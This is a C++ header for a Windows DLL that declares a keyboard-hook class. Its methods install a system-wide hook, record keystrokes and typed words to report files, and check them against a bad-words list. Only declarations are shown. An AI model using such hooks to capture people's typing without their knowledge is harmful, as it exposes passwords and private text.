#define SETKBHOOK_API __declspec(dllexport)

#ifndef SETKBHOOK_H_
#define SETKBHOOK_H_

#include<Windows.h>
#include<iostream>

typedef void(*FNCVOIDSTR)(std::string);

extern "C" SETKBHOOK_API void StartMonitKeys(char* statsPath, char* modPath, char* badWords);

class KBHook {
private:
	HHOOK _hhookSysMsg;
	HINSTANCE _hDLL;

public:
	KBHook():_hhookSysMsg(nullptr), _hDLL(nullptr) {
	}
	bool LoadDll();
	bool SetWhereToWriteKeys(char * keysReportPath);
	bool SetWhereToWriteWords(char* wordsReportPath);
	bool SetWhereToReadBadWords(char* badWordsSourcePath);
	bool SetKeyBoardHook();

	void Run();
	~KBHook();
private:
	bool SendStrToDllFunction(char * str, const char * dllFunctName);
};
#endif 